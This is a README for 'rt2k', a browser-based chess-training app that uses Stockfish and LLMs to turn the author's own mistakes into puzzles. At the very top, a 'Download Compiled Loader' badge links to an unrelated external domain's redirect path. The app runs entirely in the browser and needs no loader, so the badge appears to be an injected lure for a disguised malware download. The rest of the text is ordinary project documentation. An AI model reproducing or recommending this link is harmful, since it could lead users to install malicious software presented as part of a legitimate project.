# rt2k

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

I’m trying to get to 2000 in chess, and I hit a wall.

Most puzzle sites are great, but they’re not really about me — they’re not tuned to my mistakes, my time trouble, or the specific patterns I keep blundering. rt2k is my attempt to fix that.

This project is a personal training ground that:

- Analyzes my own games with Stockfish
- Turns my recurring mistakes into tailored puzzles
- Experiments with different LLMs to generate guidance and explanations

It started as “I have a problem in my chess” and turned into “what if I just built the tool I wish existed?”

## What rt2k does

rt2k focuses on **personalized chess improvement** rather than generic puzzles:

- Imports and analyzes my own games with Stockfish
- Detects recurring mistakes and patterns across games
- Generates training positions and exercises based on those mistakes
- Uses different LLMs to explain ideas, suggest plans, and act like a lightweight coach

The goal is not to be another big chess site, but a small tool that is brutally focused on my weaknesses and my road to 2000.

## Tech at a glance

Under the hood, rt2k is built as a modern web app:

- **Framework:** Nuxt 4 + Vue 3 + @nuxt/ui
- **Chess logic:** chess.js for rules and PGN handling
- **Board UI:** chessground for interactive boards
- **Engine:** Stockfish 18 running locally via Web Workers
- **Language:** TypeScript-first codebase
- **Persistence:** Local-first storage using **IndexedDB** (via `idb-keyval`)

The app runs entirely in your browser. All analysis (via Stockfish WASM) and data storage are local, ensuring maximum privacy and zero latency.

## Getting started (local dev)

> Note: This is a personal project in active development. Things may change.

1. **Clone the repository**

   ```bash
   git clone https://github.com/darksolitaire9-hub/rt2k.git
   cd rt2k
   ```

2. **Install dependencies**

   Use your preferred package manager (example with npm):

   ```bash
   npm install
   ```

3. **Environment variables**

   - Copy `.env.example` to `.env`.

4. **Run the dev server**

   ```bash
   npm run dev
   ```

5. Open the app in your browser at the URL printed in the terminal.

## Architecture

rt2k is intentionally structured with clear layers:

- `shared/domain/` — core chess and analysis domain logic (entities, value objects, services)
- `shared/application/` — use cases and application services that orchestrate the domain
- `app/` — Nuxt/Vue app (components, pages, layouts, composables, workers)
- `app/workers/` — Web Workers for running Stockfish and heavy analysis off the main thread
- `docs/` — project “constitution”, plans, data model, and design decisions

The idea is to keep the chess and analysis brain independent from the UI, so the same core logic could power other interfaces in the future.

For more detail, check the files under `./docs` (plan, data-model, decisions, etc.).

## AI collaborators

rt2k is built by me, with a lot of help from modern tooling:

- **Gemini** – primary coding assistant, especially for refactors, automation, and security hardening
- **Claude** and other LLMs – used for architecture discussions, documentation, and design ideas
- **Stockfish 18** – the actual engine doing the heavy chess evaluation

I try to keep the repo honest about AI assistance so it can also serve as a small case study in human + AI collaboration. The goal is not to hide the AI but to show how it fits into a real project aimed at a concrete goal: reaching 2000.

## Security & privacy

This is an early-stage personal project, so the security posture is evolving. Current focus:

- Keeping environment variables and secrets out of the repo
- Planning local security and data integrity before storing user data
- Running chess analysis locally in the browser via Web Workers
- Gradually adding documentation in `SECURITY.md` and `docs/security-rules.md`

If you notice a security issue or a risky pattern, please open an issue or contact me privately. I appreciate responsible disclosure.

## Status & contributions

rt2k is primarily built for my own training, but the code is public in case it helps others or sparks ideas.

Contributions, suggestions, and issues are welcome, especially around:

- Better training ideas and features for practical improvement
- UI/UX tweaks that make analysis and puzzle solving smoother
- Security and privacy improvements as the application evolves

If you send a PR, please keep it small and focused, and feel free to mention if you used an LLM (Gemini, Claude, etc.) to help write it.

## License

This project is licensed under the [MIT License](./LICENSE).
